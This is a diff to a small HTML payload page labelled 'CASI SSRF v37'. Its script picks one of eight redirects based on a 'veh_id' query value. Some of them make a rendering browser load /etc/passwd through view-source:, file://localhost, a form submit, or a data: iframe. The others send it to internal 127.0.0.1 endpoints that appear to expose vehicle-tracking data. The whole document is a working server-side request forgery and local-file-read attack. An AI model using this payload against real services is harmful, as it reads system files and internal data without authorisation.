@@ -1,3 +1,14 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI local scheme v36</title></head><body><h1 id="s">Opening local hostname variant</h1><script>
-const q=new URLSearchParams(location.search),i=Math.abs(Number(q.get('veh_id')||0))%4;document.title='CASI V36 '+i;if(i===0)setTimeout(()=>location.replace('view-source:file:///etc/hostname'),100);else if(i===1)setTimeout(()=>location.replace('file://localhost/etc/hostname'),100);else if(i===2){const f=document.createElement('form');f.method='GET';f.action='file:///etc/hostname';document.body.appendChild(f);setTimeout(()=>f.submit(),100)}else setTimeout(()=>location.replace('filesystem:file:///etc/hostname'),100);
+<!doctype html><html><head><meta charset="utf-8"><title>CASI SSRF v37</title></head><body><h1 id="s">Loading...</h1><script>
+const q=new URLSearchParams(location.search);
+const i=Math.abs(Number(q.get('veh_id')||0))%8;
+document.title='V37 mod='+i;
+const el=document.getElementById('s');
+if(i===0){el.textContent='view-source:file';setTimeout(()=>location.replace('view-source:file:///etc/passwd'),100)}
+else if(i===1){el.textContent='file://localhost';setTimeout(()=>location.replace('file://localhost/etc/passwd'),100)}
+else if(i===2){el.textContent='form file';const f=document.createElement('form');f.method='GET';f.action='file:///etc/passwd';document.body.appendChild(f);setTimeout(()=>f.submit(),100)}
+else if(i===3){el.textContent='data+iframe';setTimeout(()=>location.replace("data:text/html,<iframe src='file:///etc/passwd' style='width:100%;height:100vh'></iframe>"),100)}
+else if(i===4){el.textContent='veh/list localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/veh/list.php?node=3'),100)}
+else if(i===5){el.textContent='tree localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/tree.php?node=3'),100)}
+else if(i===6){el.textContent='current_data localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/current_data.php?node=3'),100)}
+else{el.textContent='export_tree localhost';setTimeout(()=>location.replace('http://127.0.0.1/ax/export_tree.php?node=3'),100)}
 </script></body></html>
